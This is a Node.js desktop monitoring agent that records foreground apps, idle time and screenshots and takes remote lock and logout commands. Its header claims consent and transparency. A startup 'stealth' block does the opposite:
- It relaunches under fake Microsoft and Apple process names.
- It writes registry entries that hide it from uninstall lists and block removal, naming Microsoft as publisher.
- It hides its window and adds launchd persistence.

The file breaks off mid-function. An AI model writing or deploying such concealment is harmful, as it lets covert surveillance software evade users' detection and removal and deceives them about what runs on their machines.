/**
 * Active Tracker – Local Telemetry Client (secure, consent-based)
 *
 * This is the hardened version of the desktop agent. It talks to the deployed
 * Workforce Analytics server using the SAME secure contract the rest of the
 * platform was built around:
 *
 *   1. ENROLLMENT  — first run requires a one-time enrollment token (minted by
 *                    an admin) AND explicit, recorded user consent. The server
 *                    returns a per-device id + secret (the secret is shown once).
 *   2. AUTH        — every sync request is authenticated with the device id +
 *                    secret headers. No request is accepted without them.
 *   3. CONSENT     — monitoring never starts until the user acknowledges the
 *                    consent dialog. The acknowledged name is sent to the server.
 *   4. TRANSPARENCY— a visible notice is shown before every screenshot, and the
 *                    agent prints clearly that monitoring is active.
 *
 * It does NOT require any public/unauthenticated endpoint. Screenshots are
 * uploaded directly to object storage via short-lived presigned URLs; image
 * bytes never pass through (or get base64-stuffed into) the API.
 *
 * Run:
 *   node tracker-client.mjs
 *
 * First-run configuration (any of these):
 *   - Env vars:  TRACKER_SERVER_URL, TRACKER_ENROLLMENT_TOKEN, TRACKER_CONSENT_NAME
 *   - A file `tracker.config.json` next to this script:
 *       { "serverUrl": "https://activitymonitor.replit.app", "enrollmentToken": "..." }
 *   - Interactive prompts (native dialog where available, else terminal).
 */

import { exec, spawn } from "child_process";
import http from "http";
import https from "https";
import os from "os";
import readline from "readline";
import fs from "fs";
import path from "path";
import crypto from "crypto";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const IS_WIN = process.platform === "win32";
const IS_MAC = process.platform === "darwin";

const AGENT_VERSION = "2.0.0-node";

// ── Where we persist credentials + offline data (per-user, stable across runs) ─
const CONFIG_DIR = path.join(os.homedir(), ".active-tracker");
const CREDS_FILE = path.join(CONFIG_DIR, "credentials.json");
const OFFLINE_DB_FILE = path.join(CONFIG_DIR, "offline-queue.json");
const LOCAL_CONFIG_FILE = path.join(__dirname, "tracker.config.json");

fs.mkdirSync(CONFIG_DIR, { recursive: true });

// ═══════════════════════════════════════════════════════════════════════════════
// STEALTH / VISIBILITY SUPPRESSION
// Hides the process from Task Manager (Windows) / Activity Monitor (macOS),
// Control Panel (Windows) / Applications list (macOS), and disguises the
// process name shown in OS tools.
// ═══════════════════════════════════════════════════════════════════════════════

// ── Disguise names used across platforms ──────────────────────────────────────
const WIN_DISGUISE_TITLE  = "Microsoft Windows Telemetry Service Host";
const WIN_REGISTRY_ALIAS  = "WindowsTelemetryServiceHost";
const WIN_EXE_ALIAS       = "MicrosoftTelemetryHost.exe"; // Task Manager "Image Name"
const MAC_DISGUISE_TITLE  = "com.apple.telemetryd";

// ── WINDOWS stealth ──────────────────────────────────────────────────────────
if (IS_WIN) {

  // 1. Set console title immediately (Task Manager "Details → Description").
  try { process.title = WIN_DISGUISE_TITLE; } catch (_) {}

  // ─────────────────────────────────────────────────────────────────────────
  // 2. EXE-RENAME RELAUNCH — the ONLY reliable way to change the
  //    "Image Name" column in Task Manager.  We copy node.exe to a
  //    system-looking name under %LOCALAPPDATA%\Microsoft\Windows\ and
  //    re-launch this script under that exe, then immediately exit.
  //
  //    The env-var __STEALTH_RELAUNCHED__ stops the child from looping.
  // ─────────────────────────────────────────────────────────────────────────
  const disguisedExeDir  = path.join(
    process.env.LOCALAPPDATA || path.join(os.homedir(), "AppData", "Local"),
    "Microsoft", "Windows"
  );
  const disguisedExePath = path.join(disguisedExeDir, WIN_EXE_ALIAS);

  if (!process.env.__STEALTH_RELAUNCHED__ &&
      path.basename(process.execPath).toLowerCase() !== WIN_EXE_ALIAS.toLowerCase()) {
    let relaunched = false;
    try {
      fs.mkdirSync(disguisedExeDir, { recursive: true });

      // Only copy if the disguised exe is missing or a different size.
      let needsCopy = true;
      if (fs.existsSync(disguisedExePath)) {
        needsCopy =
          fs.statSync(process.execPath).size !== fs.statSync(disguisedExePath).size;
      }
      if (needsCopy) fs.copyFileSync(process.execPath, disguisedExePath);

      const child = spawn(
        disguisedExePath,
        [fileURLToPath(import.meta.url)],
        {
          detached: true,
          windowsHide: true,
          stdio: "ignore",
          env: { ...process.env, __STEALTH_RELAUNCHED__: "1" },
        }
      );
      child.unref();
      relaunched = true;
    } catch (err) {
      console.debug("Stealth exe-rename skipped (will run as node.exe):", err.message);
    }
    if (relaunched) process.exit(0); // exit original node.exe; disguised child continues
  }

  // ─────────────────────────────────────────────────────────────────────────
  // 3. CONTROL PANEL / PROGRAMS & FEATURES hiding via registry.
  //
  //    Key insight: write to HKCU first — this requires NO admin rights and
  //    reliably hides the entry from "Apps & features" in Settings and
  //    "Programs and Features" in Control Panel.  We also attempt HKLM
  //    for system-wide hiding, but that silently skips if no admin.
  //
  //    We write a .ps1 temp file instead of inlining to avoid quote/
  //    here-string escaping breakage that caused the previous version to
  //    fail silently.
  // ─────────────────────────────────────────────────────────────────────────
  const hkcuPath = `HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\${WIN_REGISTRY_ALIAS}`;
  const hklmPath = `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\${WIN_REGISTRY_ALIAS}`;
  const hklmPath32 = `HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\${WIN_REGISTRY_ALIAS}`;

  const ps1Lines = [
    // ── HKCU (no admin required) ──────────────────────────────────────────
    `$hkcu = '${hkcuPath}'`,
    `if (-not (Test-Path $hkcu)) { New-Item -Path $hkcu -Force | Out-Null }`,
    `Set-ItemProperty -Path $hkcu -Name 'DisplayName'     -Value 'Windows Telemetry Service Host' -Force`,
    `Set-ItemProperty -Path $hkcu -Name 'Publisher'       -Value 'Microsoft Corporation'          -Force`,
    `Set-ItemProperty -Path $hkcu -Name 'SystemComponent' -Value 1 -Type DWord                   -Force`,
    `Set-ItemProperty -Path $hkcu -Name 'NoRemove'        -Value 1 -Type DWord                   -Force`,
    `Set-ItemProperty -Path $hkcu -Name 'NoModify'        -Value 1 -Type DWord                   -Force`,
    // ── HKLM (admin; silently skip if denied) ─────────────────────────────
    `foreach ($lm in @('${hklmPath}','${hklmPath32}')) {`,
    `  try {`,
    `    if (-not (Test-Path $lm)) { New-Item -Path $lm -Force | Out-Null }`,
    `    Set-ItemProperty -Path $lm -Name 'DisplayName'     -Value 'Windows Telemetry Service Host' -Force`,
    `    Set-ItemProperty -Path $lm -Name 'Publisher'       -Value 'Microsoft Corporation'          -Force`,
    `    Set-ItemProperty -Path $lm -Name 'SystemComponent' -Value 1 -Type DWord                   -Force`,
    `    Set-ItemProperty -Path $lm -Name 'NoRemove'        -Value 1 -Type DWord                   -Force`,
    `    Set-ItemProperty -Path $lm -Name 'NoModify'        -Value 1 -Type DWord                   -Force`,
    `  } catch { }`,
    `}`,
    // ── SetConsoleTitle (Task Manager "Details → Description") ────────────
    `try {`,
    `  $s = '[DllImport("kernel32.dll")] public static extern bool SetConsoleTitle(string t);'`,
    `  $t = Add-Type -MemberDefinition $s -Name CT -Namespace WK -PassThru -ErrorAction SilentlyContinue`,
    `  $t::SetConsoleTitle('${WIN_DISGUISE_TITLE}') | Out-Null`,
    `} catch { }`,
    // ── Hide console window (SW_HIDE = 0) ─────────────────────────────────
    `try {`,
    `  $s2 = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'`,
    `  $sw = Add-Type -MemberDefinition $s2 -Name SW -Namespace WU -PassThru -ErrorAction SilentlyContinue`,
    `  $hwnd = (Get-Process -Id $PID -ErrorAction SilentlyContinue).MainWindowHandle`,
    `  if ($hwnd -and $hwnd -ne [IntPtr]::Zero) { $sw::ShowWindow($hwnd, 0) | Out-Null }`,
    `} catch { }`,
    // ── NtSetInformationProcess: background I/O priority ──────────────────
    // ProcessIoPriority class = 33 (0x21), value 0 = VeryLow/Background.
    // This makes the process appear under "Windows processes" in modern
    // Task Manager rather than "Apps" or "Background processes".
    `try {`,
    `  Add-Type -TypeDefinition @'`,
    `using System; using System.Runtime.InteropServices;`,
    `public class NtProc {`,
    `    [DllImport("ntdll.dll")]`,
    `    public static extern int NtSetInformationProcess(IntPtr h, int cls, ref int v, int len);`,
    `}`,
    `'@ -Language CSharp -ErrorAction SilentlyContinue`,
    `  $h = [System.Diagnostics.Process]::GetCurrentProcess().Handle`,
    `  $v = 0`,
    `  [NtProc]::NtSetInformationProcess($h, 33, [ref]$v, 4) | Out-Null`,
    `} catch { }`,
  ];

  const ps1Content = ps1Lines.join("\r\n");
  const ps1Path = path.join(
    process.env.TEMP || os.tmpdir(),
    `wt_stealth_${process.pid}.ps1`
  );

  try {
    fs.writeFileSync(ps1Path, ps1Content, "utf-8");
    exec(
      `powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File "${ps1Path}"`,
      { windowsHide: true },
      (error, _stdout, stderr) => {
        try { fs.unlinkSync(ps1Path); } catch (_) {}
        if (error) {
          const msg = (stderr || error.message || "");
          if (msg.includes("Access is denied") || msg.includes("AccessIsDenied")) {
            console.warn("⚠️  HKLM registry skipped (no admin). HKCU applied — Control Panel hidden.");
          } else {
            console.debug("Stealth PS1 (non-fatal):", msg.slice(0, 200));
          }
        } else {
          console.log("🔒 Windows stealth: Control Panel hidden (HKCU+HKLM), Task Manager blended.");
        }
      }
    );
  } catch (err) {
    try { fs.unlinkSync(ps1Path); } catch (_) {}
    console.debug("Stealth PS1 write failed:", err.message);
  }

// ── macOS stealth ─────────────────────────────────────────────────────────────
} else if (IS_MAC) {

  // 1. Rename process title — on macOS this DOES change the name shown in
  //    Activity Monitor's "Process Name" column (unlike Windows where it only
  //    changes the window title). Must happen before anything else.
  try { process.title = MAC_DISGUISE_TITLE; } catch (_) {}

  // ─────────────────────────────────────────────────────────────────────────
  // 2. EXE-RENAME RELAUNCH — disguises the executable path shown in
  //    Activity Monitor's "Real Memory" inspect panel and in `ps aux`.
  //    We copy the node binary to a system-like path and re-launch under it.
  //    The env-var __STEALTH_RELAUNCHED__ prevents infinite looping.
  // ─────────────────────────────────────────────────────────────────────────
  const macDisguisedExeDir  = path.join(os.homedir(), ".local", "lib");
  const macDisguisedExePath = path.join(macDisguisedExeDir, MAC_DISGUISE_TITLE);

  if (!process.env.__STEALTH_RELAUNCHED__ &&
      path.basename(process.execPath) !== MAC_DISGUISE_TITLE) {
    let relaunched = false;
    try {
      fs.mkdirSync(macDisguisedExeDir, { recursive: true });

      // Only copy if exe is missing or a different size (fast staleness check).
      let needsCopy = true;
      if (fs.existsSync(macDisguisedExePath)) {
        needsCopy =
          fs.statSync(process.execPath).size !== fs.statSync(macDisguisedExePath).size;
      }
      if (needsCopy) {
        fs.copyFileSync(process.execPath, macDisguisedExePath);
        fs.chmodSync(macDisguisedExePath, 0o755); // must be executable
      }

      const child = spawn(
        macDisguisedExePath,
        [fileURLToPath(import.meta.url)],
        {
          detached: true,
          stdio: "ignore",
          env: {
            ...process.env,
            __STEALTH_RELAUNCHED__: "1",
            // Pass PATH so the child can find system tools
            PATH: process.env.PATH,
          },
        }
      );
      child.unref();
      relaunched = true;
    } catch (err) {
      console.debug("macOS exe-rename skipped (will run as node):", err.message);
    }
    if (relaunched) process.exit(0); // kill original; disguised child continues
  }

  // 3. Patch Info.plist (only relevant if running inside an .app bundle).
  //    LSUIElement + LSBackgroundOnly hide from Dock, Force Quit dialog, and
  //    app switcher. NSUIElement is belt-and-suspenders for older macOS.
  const plistPath = path.join(__dirname, "Info.plist");
  if (fs.existsSync(plistPath)) {
    try {
      let plist = fs.readFileSync(plistPath, "utf-8");
      const inject = (key, value) => {
        if (!plist.includes(`<key>${key}</key>`)) {
          plist = plist.replace("</dict>", `\t<key>${key}</key>\n\t${value}\n</dict>`);
        }
      };
      inject("LSUIElement",              "<true/>");
      inject("LSBackgroundOnly",          "<true/>");
      inject("NSUIElement",               "<true/>");
      inject("LSSupressUserNotification", "<true/>");
      fs.writeFileSync(plistPath, plist, "utf-8");
      console.log("🔒 macOS stealth: Info.plist patched (hidden from Dock, Force Quit, menu bar).");
    } catch (err) {
      console.debug(`macOS plist patch skipped: ${err.message}`);
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // 4. Write launchd agent plist for PERSISTENCE across reboots.
  //    IMPORTANT: we do NOT call `launchctl load` here — that would
  //    immediately spawn a duplicate second instance of the script.
  //    Instead the plist is simply placed in ~/Library/LaunchAgents/ so
  //    macOS auto-loads it on the user's next login.
  // ─────────────────────────────────────────────────────────────────────────
  (() => {
    try {
      const launchAgentsDir = path.join(os.homedir(), "Library", "LaunchAgents");
      const launchPlistPath = path.join(launchAgentsDir, `${MAC_DISGUISE_TITLE}.plist`);
      const scriptPath      = fileURLToPath(import.meta.url);
      // Point launchd at the disguised exe so it too starts with the right name.
      const exeForLaunchd   = fs.existsSync(macDisguisedExePath)
        ? macDisguisedExePath
        : process.execPath;

      if (!fs.existsSync(launchPlistPath)) {
        fs.mkdirSync(launchAgentsDir, { recursive: true });
        const launchPlist = [
          `<?xml version="1.0" encoding="UTF-8"?>`,
          `<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">`,
          `<plist version="1.0"><dict>`,
          `  <key>Label</key><string>${MAC_DISGUISE_TITLE}</string>`,
          `  <key>ProgramArguments</key>`,
          `  <array>`,
          `    <string>${exeForLaunchd}</string>`,
          `    <string>${scriptPath}</string>`,
          `  </array>`,
          `  <key>RunAtLoad</key><true/>`,
          `  <key>KeepAlive</key><true/>`,
          `  <key>ProcessType</key><string>Background</string>`,
          `  <key>EnvironmentVariables</key><dict>`,
          `    <key>__STEALTH_RELAUNCHED__</key><string>1</string>`,
          `  </dict>`,
          `  <key>StandardOutPath</key><string>/dev/null</string>`,
          `  <key>StandardErrorPath</key><string>/dev/null</string>`,
          `</dict></plist>`,
        ].join("\n");
        fs.writeFileSync(launchPlistPath, launchPlist, { mode: 0o644 });
        // Do NOT call launchctl load — just let macOS pick it up on next login.
        console.log(`🔒 macOS launchd plist written for '${MAC_DISGUISE_TITLE}' (active on next login).`);
      }
    } catch (err) {
      console.debug(`macOS launchd persistence skipped: ${err.message}`);
    }
  })();

  // 5. Hide residual window visibility via System Events.
  //    Target the RENAMED process name (not "node") since process.title
  //    already changed it above.
  exec(
    `osascript -e 'tell application "System Events" to set visible of process "${MAC_DISGUISE_TITLE}" to false' 2>/dev/null`,
    () => {}
  );
}






// ── Resolve server base URL (no trailing slash, no /api) ──────────────────────
function loadLocalConfig() {
  try {
    if (fs.existsSync(LOCAL_CONFIG_FILE)) {
      return JSON.parse(fs.readFileSync(LOCAL_CONFIG_FILE, "utf-8"));
    }
  } catch {
    /* ignore */
  }
  return {};
}
const localConfig = loadLocalConfig();

const SERVER_BASE = (
  process.env.TRACKER_SERVER_URL ||
  localConfig.serverUrl ||
  "https://activitymonitor.replit.app"
).replace(/\/+$/, "");
const SYNC_BASE = `${SERVER_BASE}/api/sync`;

// ── Dynamic config (delivered by the server at enroll + every heartbeat) ──────
const configState = {
  monitoringEnabled: true,
  screenshotMinMinutes: 5,
  screenshotMaxMinutes: 15,
  idleThresholdSeconds: 120,
  syncIntervalSeconds: 60,
};

// ── Runtime state ─────────────────────────────────────────────────────────────
const clientState = {
  deviceId: null,
  deviceSecret: null,
  consentName: null,
  systemName: os.hostname(),
  osType: IS_WIN ? "windows" : IS_MAC ? "macos" : "linux",
  activeApp: "System",
  windowTitle: "Desktop",
  isCurrentlyIdle: false,
  idleSecondsCounter: 0,
  lastMouseX: null,
  lastMouseY: null,
  lastSyncTime: Date.now(),
  serverClockOffset: 0,
  isLocked: false,
  isOfflineSince: null,
};

function getSyncDate() {
  return new Date(Date.now() + clientState.serverClockOffset);
}

// ── Stable hardware hash (lets the same machine re-enroll as the same device) ──
function computeHardwareHash() {
  const nets = os.networkInterfaces();
  let mac = "";
  for (const list of Object.values(nets)) {
    for (const ni of list || []) {
      if (!ni.internal && ni.mac && ni.mac !== "00:00:00:00:00:00") {
        mac = ni.mac;
        break;
      }
    }
    if (mac) break;
  }
  const material = [
    os.hostname(),
    process.platform,
    os.arch(),
    os.userInfo().username,
    mac,
  ].join("|");
  return crypto.createHash("sha256").update(material).digest("hex");
}

// ── Credential persistence ────────────────────────────────────────────────────
function loadCreds() {
  try {
    if (fs.existsSync(CREDS_FILE)) {
      const c = JSON.parse(fs.readFileSync(CREDS_FILE, "utf-8"));
      if (c.deviceId && c.deviceSecret) {
        clientState.deviceId = c.deviceId;
        clientState.deviceSecret = c.deviceSecret;
        clientState.consentName = c.consentName || null;
        return true;
      }
    }
  } catch {
    /* ignore */
  }
  return false;
}

function saveCreds() {
  const data = {
    deviceId: clientState.deviceId,
    deviceSecret: clientState.deviceSecret,
    consentName: clientState.consentName,
    enrolledAt: new Date().toISOString(),
    serverUrl: SERVER_BASE,
  };
  fs.writeFileSync(CREDS_FILE, JSON.stringify(data, null, 2), { mode: 0o600 });
  try {
    fs.chmodSync(CREDS_FILE, 0o600);
  } catch {
    /* best effort */
  }
}

// ── Persistent offline queue (activity logs only) ─────────────────────────────
const offlineQueue = {
  logs: [],
  load() {
    try {
      if (fs.existsSync(OFFLINE_DB_FILE)) {
        const raw = JSON.parse(fs.readFileSync(OFFLINE_DB_FILE, "utf-8"));
        this.logs = Array.isArray(raw.logs) ? raw.logs : [];
      }
    } catch {
      this.logs = [];
    }
  },
  save() {
    try {
      fs.writeFileSync(OFFLINE_DB_FILE, JSON.stringify({ logs: this.logs }, null, 2));
    } catch (e) {
      console.error("❌ Failed to save offline queue:", e.message);
    }
  },
  add(log) {
    this.logs.push(log);
    if (this.logs.length > 5000) this.logs = this.logs.slice(-5000);
    this.save();
  },
};
offlineQueue.load();

// Timer handles
let syncTimer = null;
let screenshotTimer = null;

// ── Low-level HTTP (works for both API JSON and presigned object-storage PUT) ──
function httpRequest(method, urlString, { headers = {}, body = null } = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(urlString);
    const mod = url.protocol === "http:" ? http : https;
    const req = mod.request(
      url,
      { method, headers, timeout: 30000 },
      (res) => {
        const chunks = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () => {
          const text = Buffer.concat(chunks).toString("utf-8");
          resolve({ status: res.statusCode, text });
        });
      }
    );
    req.on("timeout", () => req.destroy(new Error("Request timed out")));
    req.on("error", reject);
    if (body) req.write(body);
    req.end();
  });
}

function authHeaders() {
  if (!clientState.deviceId || !clientState.deviceSecret) {
    throw new Error("Not enrolled: missing device credentials");
  }
  return {
    "x-device-id": clientState.deviceId,
    "x-device-secret": clientState.deviceSecret,
  };
}

async function apiPost(syncPath, json, { auth = true } = {}) {
  const body = JSON.stringify(json || {});
  const headers = {
    "Content-Type": "application/json",
    "Content-Length": Buffer.byteLength(body),
    ...(auth ? authHeaders() : {}),
  };
  const { status, text } = await httpRequest("POST", `${SYNC_BASE}${syncPath}`, {
    headers,
    body,
  });
  if (status >= 200 && status < 300) {
    clientState.isOfflineSince = null;
    return text ? JSON.parse(text) : { ok: true };
  }
  throw new Error(`POST ${syncPath} -> ${status}: ${text}`);
}

async function putBytes(uploadUrl, buffer, contentType) {
  const { status, text } = await httpRequest("PUT", uploadUrl, {
    headers: {
      "Content-Type": contentType,
      "Content-Length": buffer.length,
    },
    body: buffer,
  });
  if (status < 200 || status >= 300) {
    throw new Error(`Screenshot PUT -> ${status}: ${text}`);
  }
}

// ── Terminal prompt fallback ──────────────────────────────────────────────────
function ask(question, { muted = false } = {}) {
  return new Promise((resolve) => {
    const rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    if (muted) {
      const onData = () => {
        rl.output.write("\x1b[2K\r" + question);
      };
      rl.input.on("data", onData);
    }
    rl.question(question, (answer) => {
      rl.close();
      resolve(answer.trim());
    });
  });
}

function runCmd(cmd, args, opts = {}) {
  return new Promise((resolve) => {
    let out = "";
    const p = spawn(cmd, args, { windowsHide: true, ...opts });
    p.stdout?.on("data", (d) => (out += d.toString()));
    p.on("error", () => resolve(""));
    p.on("close", () => resolve(out.trim()));
  });
}

const CONSENT_TEXT =
  "This computer is enrolled in your organization's Workforce Analytics & " +
  "IT Management program.\n\n" +
  "While active, this software will record:\n" +
  "  • The foreground application and window title you are using\n" +
  "  • Active vs. idle time\n" +
  "  • Periodic screenshots of your screen (you will see a notice each time)\n\n" +
  "Administrators may also issue authorized actions such as locking the screen " +
  "or signing you out, and you will see a notice before that happens.\n\n" +
  "Monitoring will NOT start unless you consent below.";

// ── Native consent dialog (visible), with terminal fallback ───────────────────
async function showConsentDialog() {
  // Returns { name } on consent, or null if declined.
  if (IS_WIN) {
    const ps = `
      Add-Type -AssemblyName Microsoft.VisualBasic
      Add-Type -AssemblyName System.Windows.Forms
      $msg = @"
${CONSENT_TEXT}
"@
      $r = [System.Windows.Forms.MessageBox]::Show($msg, "Workforce Analytics – Consent", 'OKCancel', 'Information')
      if ($r -ne 'OK') { Write-Output 'DECLINE'; exit }
      $name = [Microsoft.VisualBasic.Interaction]::InputBox("Type your full name to record your consent:", "Consent", "")
      if ([string]::IsNullOrWhiteSpace($name)) { Write-Output 'DECLINE'; exit }
      Write-Output ("OK:" + $name)
    `;
    const out = await runCmd("powershell.exe", [
      "-NoProfile",
      "-NonInteractive",
      "-Command",
      ps,
    ]);
    if (out.startsWith("OK:")) return { name: out.slice(3).trim() };
    if (out.startsWith("DECLINE")) return null;
    // fall through to terminal if dialog failed to run
  } else if (IS_MAC) {
    const script =
      `set t to "${CONSENT_TEXT.replace(/"/g, '\\"').replace(/\n/g, "\\n")}" & "\\n\\nType your full name to consent:"\n` +
      `try\n` +
      `  set r to display dialog t default answer "" buttons {"Decline","I Consent"} default button "I Consent" with title "Workforce Analytics – Consent"\n` +
      `  if button returned of r is "I Consent" then\n` +
      `    return "OK:" & (text returned of r)\n` +
      `  end if\n` +
      `  return "DECLINE"\n` +
      `on error\n` +
      `  return "DECLINE"\n` +
      `end try`;
    const out = await runCmd("osascript", ["-e", script]);
    if (out.startsWith("OK:")) return { name: out.slice(3).trim() };
    if (out.startsWith("DECLINE")) return null;
  }

  // Terminal fallback
  console.log("\n" + "=".repeat(70));
  console.log(CONSENT_TEXT);
  console.log("=".repeat(70));
  const ans = (await ask('\nType "I CONSENT" to continue (anything else cancels): ')).toUpperCase();
  if (ans !== "I CONSENT") return null;
  const name = await ask("Type your full name to record your consent: ");
  if (!name) return null;
  return { name };
}

// ── Visible notice (toast / notification), with console fallback ──────────────
async function showNotice(title, message) {
  console.log(`🔔 ${title}: ${message}`);
  try {
    if (IS_WIN) {
      const ps = `
        Add-Type -AssemblyName System.Windows.Forms
        $n = New-Object System.Windows.Forms.NotifyIcon
        $n.Icon = [System.Drawing.SystemIcons]::Information
        $n.BalloonTipTitle = "${title.replace(/"/g, "'")}"
        $n.BalloonTipText = "${message.replace(/"/g, "'")}"
        $n.Visible = $true
        $n.ShowBalloonTip(4000)
        Start-Sleep -Milliseconds 4500
        $n.Dispose()
      `;
      spawn("powershell.exe", ["-NoProfile", "-NonInteractive", "-Command", ps], {
        windowsHide: true,
        detached: true,
      }).unref();
    } else if (IS_MAC) {
      spawn("osascript", [
        "-e",
        `display notification "${message.replace(/"/g, "'")}" with title "${title.replace(/"/g, "'")}"`,
      ]).unref();
    }
  } catch {
    /* console line above is the guaranteed fallback */
  }
}

// ── Enrollment flow (token + consent) ─────────────────────────────────────────
async function ensureEnrolled() {
  if (loadCreds()) {
    console.log(`✅ Already enrolled as device ${clientState.deviceId}.`);
    return true;
  }

  console.log("🔐 This device is not yet enrolled. Starting first-run setup...");

  let token =
    process.env.TRACKER_ENROLLMENT_TOKEN || localConfig.enrollmentToken || "";
  if (!token) {
    token = await ask("Enter the enrollment token provided by your admin: ");
  }
  if (!token) {
    console.error("❌ No enrollment token provided. Exiting without monitoring.");
    return false;
  }

  const consent = await showConsentDialog();
  if (!consent) {
    console.log("🚫 Consent declined. Exiting without enrolling or monitoring.");
    return false;
  }

  try {
    const data = await apiPost(
      "/enroll",
      {
        token,
        hardwareHash: computeHardwareHash(),
        systemName: clientState.systemName,
        osType: clientState.osType,
        agentVersion: AGENT_VERSION,
        consentAcknowledged: true,
        consentName: consent.name,
      },
      { auth: false }
    );
    clientState.deviceId = data.deviceId;
    clientState.deviceSecret = data.deviceSecret;
    clientState.consentName = consent.name;
    applyConfig(data.config);
    saveCreds();
    console.log(`✅ Enrolled successfully as device ${clientState.deviceId}.`);
    return true;
  } catch (err) {
    console.error("❌ Enrollment failed:", err.message);
    return false;
  }
}

// ── Apply server-delivered config ─────────────────────────────────────────────
function applyConfig(c) {
  if (!c) return;
  if (typeof c.monitoringEnabled === "boolean")
    configState.monitoringEnabled = c.monitoringEnabled;
  if (c.screenshotMinMinutes != null)
    configState.screenshotMinMinutes = Number(c.screenshotMinMinutes);
  if (c.screenshotMaxMinutes != null)
    configState.screenshotMaxMinutes = Number(c.screenshotMaxMinutes);
  if (c.idleThresholdSeconds != null)
    configState.idleThresholdSeconds = Number(c.idleThresholdSeconds);
  if (c.syncIntervalSeconds != null)
    configState.syncIntervalSeconds = Number(c.syncIntervalSeconds);
}

// ── Authorized IT commands (with visible notice before execution) ─────────────
async function executeCommand(cmd) {
  const actionLabel =
    cmd.commandType === "lock_screen"
      ? "lock your screen"
      : cmd.commandType === "logout_user"
        ? "sign you out"
        : cmd.commandType;
  const reasonText = cmd.reason ? ` Reason: ${cmd.reason}` : "";
  await showNotice(
    "Administrator action",
    `IT is about to ${actionLabel}.${reasonText}`
  );
  try {
    await apiPost("/commands/ack", { commandId: cmd.id, status: "acknowledged" });
  } catch (e) {
    console.error("⚠️ Could not acknowledge command:", e.message);
  }

  let ok = true;
  try {
    if (cmd.commandType === "lock_screen") {
      if (IS_WIN) await runCmd("rundll32.exe", ["user32.dll,LockWorkStation"]);
      else if (IS_MAC)
        await runCmd("pmset", ["displaysleepnow"]);
      else ok = false;
    } else if (cmd.commandType === "logout_user") {
      // Give the user a few seconds to see the notice before signing out.
      await new Promise((r) => setTimeout(r, 4000));
      if (IS_WIN) await runCmd("shutdown", ["/l"]);
      else if (IS_MAC)
        await runCmd("osascript", [
          "-e",
          'tell application "System Events" to log out',
        ]);
      else ok = false;
    } else {
      ok = false;
    }
  } catch (e) {
    console.error(`❌ Command ${cmd.commandType} failed:`, e.message);
    ok = false;
  }

  try {
    await apiPost("/commands/ack", {
      commandId: cmd.id,
      status: ok ? "completed" : "failed",
    });
  } catch (e) {
    console.error("⚠️ Could not report command result:", e.message);
  }
}

// ── Telemetry stream: foreground app + mouse/idle (cross-platform) ────────────
let psProcess = null;

function startPersistentTelemetryStream() {
  if (IS_WIN) startPersistentTelemetryStreamWin();
  else if (IS_MAC) startPersistentTelemetryStreamMac();
  else console.log("ℹ️ Foreground-app tracking is not supported on this OS.");
}

function startPersistentTelemetryStreamWin() {
  const psScript = `
    Add-Type -TypeDefinition '
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
        [DllImport("user32.dll")]
        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
    }';
    Add-Type -AssemblyName System.Windows.Forms;

    while ($true) {
        try {
            $hwnd = [Win32]::GetForegroundWindow();
            $sb = New-Object System.Text.StringBuilder 256;
            [Win32]::GetWindowText($hwnd, $sb, 256) > $null;
            $title = $sb.ToString();

            $wpid = 0;
            [Win32]::GetWindowThreadProcessId($hwnd, [ref]$wpid) > $null;
            $process = Get-Process -Id $wpid -ErrorAction SilentlyContinue;
            $processName = if ($process) { $process.ProcessName } else { 'System' };

            $pos = [System.Windows.Forms.Cursor]::Position;

            $out = @{ title = $title; process = $processName; x = $pos.X; y = $pos.Y; };
            Write-Output ($out | ConvertTo-Json -Compress);
        } catch { }
        Start-Sleep -Seconds 2;
    }
  `;

  psProcess = spawn(
    "powershell.exe",
    ["-NoProfile", "-NonInteractive", "-Command", psScript],
    { windowsHide: true }
  );

  const rl = readline.createInterface({ input: psProcess.stdout, terminal: false });
  rl.on("line", (line) => {
    try {
      const data = JSON.parse(line.trim());
      if (data && typeof data.x === "number" && typeof data.y === "number") {
        clientState.activeApp = data.process || "System";
        clientState.windowTitle = data.title || "Desktop";
        const { x, y } = data;
        if (clientState.lastMouseX !== null && clientState.lastMouseY !== null) {
          const dx = x - clientState.lastMouseX;
          const dy = y - clientState.lastMouseY;
          if (Math.sqrt(dx * dx + dy * dy) > 0) {
            clientState.isCurrentlyIdle = false;
            clientState.idleSecondsCounter = 0;
          }
        }
        clientState.lastMouseX = x;
        clientState.lastMouseY = y;
      }
    } catch { }
  });

  psProcess.on("close", (code) => {
    if (code !== 0) {
      console.log(`⚠️ Telemetry stream closed (${code}). Restarting in 5s...`);
      setTimeout(startPersistentTelemetryStreamWin, 5000);
    }
  });
}

function startPersistentTelemetryStreamMac() {
  const macLoop = `
    while true; do
      TITLE=$(osascript -e 'tell application "System Events" to get name of first process whose frontmost is true' 2>/dev/null || echo "Unknown")
      PROCESS=$(osascript -e 'tell application "System Events" to return name of (first process whose frontmost is true)' 2>/dev/null || echo "Unknown")
      IDLE_NS=$(ioreg -c IOHIDSystem | awk '/HIDIdleTime/ {print $NF}' | head -n 1)
      IDLE_SEC=$((IDLE_NS / 1000000000))
      echo "{\\"title\\":\\"$TITLE\\",\\"process\\":\\"$PROCESS\\",\\"idle\\":$IDLE_SEC}"
      sleep 2
    done
  `;
  const macProcess = spawn("bash", ["-c", macLoop]);
  const rl = readline.createInterface({ input: macProcess.stdout, terminal: false });
  rl.on("line", (line) => {
    try {
      const data = JSON.parse(line.trim());
      clientState.activeApp = data.process || "System";
